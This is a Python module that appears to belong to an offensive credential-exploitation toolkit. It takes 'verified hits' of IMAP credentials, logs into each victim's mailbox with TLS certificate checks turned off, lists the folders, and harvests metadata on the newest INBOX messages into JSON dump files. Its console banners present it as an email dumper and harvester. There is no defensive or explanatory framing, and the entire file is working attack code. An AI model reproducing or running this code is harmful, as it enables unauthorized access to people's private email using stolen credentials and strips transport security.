import asyncio
import ssl
import imaplib
import os
import json
import time

_ssl_context = ssl.create_default_context()
_ssl_context.check_hostname = False
_ssl_context.verify_mode = ssl.CERT_NONE

def dump_imap_mailbox_sync(host, port, user, password, use_ssl=True):
    """Connects to a verified IMAP mailbox account and dumps folder structures & messages."""
    dump_data = {
        "user": user,
        "host": host,
        "port": port,
        "protocol": "IMAP",
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "folders": [],
        "harvested_messages": []
    }
    try:
        if use_ssl:
            mail = imaplib.IMAP4_SSL(host, port, ssl_context=_ssl_context)
        else:
            mail = imaplib.IMAP4(host, port)
            
        mail.login(user, password)
        
        status, folders = mail.list()
        if status == 'OK':
            dump_data["folders"] = [f.decode(errors="ignore") for f in folders]
            
        mail.select('INBOX', readonly=True)
        status, messages = mail.search(None, 'ALL')
        if status == 'OK':
            id_list = messages[0].split()
            recent_ids = id_list[-5:] if len(id_list) >= 5 else id_list
            
            for msg_id in recent_ids:
                res, msg_data = mail.fetch(msg_id, '(RFC822.SIZE)')
                if res == 'OK':
                    dump_data["harvested_messages"].append({
                        "msg_id": msg_id.decode(errors="ignore"),
                        "info": str(msg_data[0])
                    })
                    
        mail.logout()
        
        os.makedirs("reports/dumps", exist_ok=True)
        dump_path = f"reports/dumps/imap_dump_{user.replace('@', '_at_')}.json"
        with open(dump_path, "w") as f:
            json.dump(dump_data, f, indent=4)
            
        return True, dump_path
    except Exception as e:
        return False, str(e)

async def harvest_email_intelligence(host, verified_hits):
    """Iterates through verified hits and triggers email dumper on IMAP accounts."""
    print(f"\n\033[95m[***] DEPLOYING EMAIL DUMPER & MAILBOX HARVESTER [***]\033[0m")
    
    if not verified_hits:
        print(f" \033[90m[-] No verified hits provided to email intelligence harvester.\033[0m")
        return

    for hit in verified_hits:
        if hit.get("type") == "IMAP":
            user = hit.get("user")
            password = hit.get("password")
            port = hit.get("port", 993)
            use_ssl = (port in [993, 465])
            
            print(f" \033[93m[*] Accessing mailbox for {user} on :{port}...\033[0m")
            success, result = await asyncio.to_thread(
                dump_imap_mailbox_sync, host, port, user, password, use_ssl
            )
            
            if success:
                print(f" \033[92m[+] MAILBOX DUMPED SUCCESSFULLY -> Saved to {result}\033[0m")
            else:
                print(f" \033[91m[-] Mailbox harvest failed: {result}\033[0m")
        else:
            print(f" \033[90m[*] Hit vector '{hit.get('type')}' is non-IMAP. Skipping mailbox dumper.\033[0m")
